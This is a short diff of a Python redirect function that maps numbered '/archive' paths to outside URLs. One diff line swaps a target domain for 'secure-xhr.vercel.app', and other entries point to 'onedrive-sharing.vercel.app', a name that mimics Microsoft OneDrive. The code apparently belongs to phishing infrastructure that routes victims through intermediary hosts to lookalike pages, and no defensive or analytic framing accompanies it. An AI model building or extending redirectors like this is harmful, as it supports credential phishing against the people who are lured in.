@@ -21,7 +21,7 @@ def get_redirect_url(path):
     elif path == '/archive8':
         return 'https://onedrive-sharing.vercel.app/'
     elif path == '/archive3467':
-        return 'https://theme.redon.ae/archive/'
+        return 'https://secure-xhr.vercel.app/'
     elif path == '/archive9':
         return 'https://onedrive-sharing.vercel.app/'
     # Add more cases for additional paths and intermediary URLs as needed
